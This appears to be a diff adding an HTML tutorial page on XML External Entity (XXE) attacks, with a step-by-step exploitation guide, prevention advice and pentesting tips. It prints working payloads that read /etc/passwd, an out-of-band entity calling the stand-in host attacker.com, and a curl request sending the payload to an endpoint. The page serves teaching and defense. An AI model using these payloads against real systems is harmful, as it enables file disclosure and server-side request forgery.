@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XML External Entities (XXE) - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>🧬 XML External Entities (XXE)</h1>
+    <p class="subtitle">Learn how improper XML parsing can lead to sensitive data exposure, SSRF, and system compromise.</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>What is XXE?</h2>
+      <p>
+        XML External Entity (XXE) is a vulnerability that occurs when an XML parser improperly processes external entities.
+        If user-supplied XML input is parsed without proper security configurations, attackers may exploit it to:
+      </p>
+      <ul>
+        <li>Read arbitrary files on the server</li>
+        <li>Perform server-side request forgery (SSRF)</li>
+        <li>Trigger Denial of Service (DoS)</li>
+        <li>Potentially gain remote code execution in rare cases</li>
+      </ul>
+    </section>
+
+    <section class="types">
+      <h2>Types of XXE Attacks</h2>
+      <div class="card">
+        <h3>1. File Disclosure</h3>
+        <p>Leaking sensitive files like <code>/etc/passwd</code> or application configs.</p>
+      </div>
+      <div class="card">
+        <h3>2. SSRF via External Entities</h3>
+        <p>Trigger internal network requests using crafted URLs in the DOCTYPE.</p>
+      </div>
+      <div class="card">
+        <h3>3. Out-of-Band (OOB) Exploitation</h3>
+        <p>Exfiltrate data via DNS, HTTP requests, or external callbacks (useful when blind).</p>
+      </div>
+    </section>
+
+    <section class="step-by-step">
+      <h2>Step-by-Step Exploitation Guide</h2>
+
+      <h3>🧪 Step 1: Identify XML Input</h3>
+      <p>Look for places where XML is accepted. Common examples:</p>
+      <ul>
+        <li>SOAP web services</li>
+        <li>API endpoints accepting XML payloads</li>
+        <li>File upload forms that accept XML files</li>
+      </ul>
+
+      <h3>🛠 Step 2: Send a Test Payload</h3>
+      <p>Basic test to check if the parser processes external entities:</p>
+      <pre><code>&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+
+      <h3>📥 Step 3: Analyze the Response</h3>
+      <p>If the file contents appear in the response or error, the target is vulnerable.</p>
+
+      <h3>🌐 Step 4: Exfiltration (OOB)</h3>
+      <p>Use your own server or Burp Collaborator to detect OOB requests:</p>
+      <pre><code>&lt;!DOCTYPE foo [ 
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM "http://attacker.com/xxe.txt"&gt; 
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
+    </section>
+
+    <section class="real-world">
+      <h2>Real-World Exploit Example</h2>
+      <p>Example using cURL against a vulnerable endpoint:</p>
+      <pre><code>curl -X POST https://target.com/api/xml \
+  -H "Content-Type: application/xml" \
+  -d '&lt;?xml version="1.0"?&gt;
+      &lt;!DOCTYPE root [
+        &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+      &lt;root&gt;&amp;xxe;&lt;/root&gt;'</code></pre>
+      <p>Observe the server’s response to confirm file disclosure.</p>
+    </section>
+
+    <section class="defense">
+      <h2>🔐 How to Prevent XXE</h2>
+      <ul>
+        <li><strong>Disable DTD processing</strong> in the XML parser</li>
+        <li>Use libraries that are safe-by-default (e.g., Jackson, lxml)</li>
+        <li>Do not accept XML unless strictly required</li>
+        <li>Validate and sanitize all incoming XML inputs</li>
+        <li>Use Content Security Policy (CSP) and network segmentation to reduce impact</li>
+      </ul>
+    </section>
+
+    <section class="tips">
+      <h2>💡 Tips for Pentesters</h2>
+      <ul>
+        <li>Always try both in-band and out-of-band vectors</li>
+        <li>Burp Suite has a built-in XXE scanner (Pro version)</li>
+        <li>Test for file disclosure and SSRF separately</li>
+        <li>Use Burp Collaborator or Interactsh for OOB data theft</li>
+      </ul>
+    </section>
+
+    <section class="resources">
+      <h2>📚 Recommended Tools</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/xxe" target="_blank">PortSwigger XXE Labs</a></li>
+        <li><a href="https://owasp.org/www-project-xml-security/" target="_blank">OWASP XML Security Project</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings: XXE</a></li>
+        <li><a href="https://github.com/projectdiscovery/interactsh" target="_blank">Interact.sh (OOB detection)</a></li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
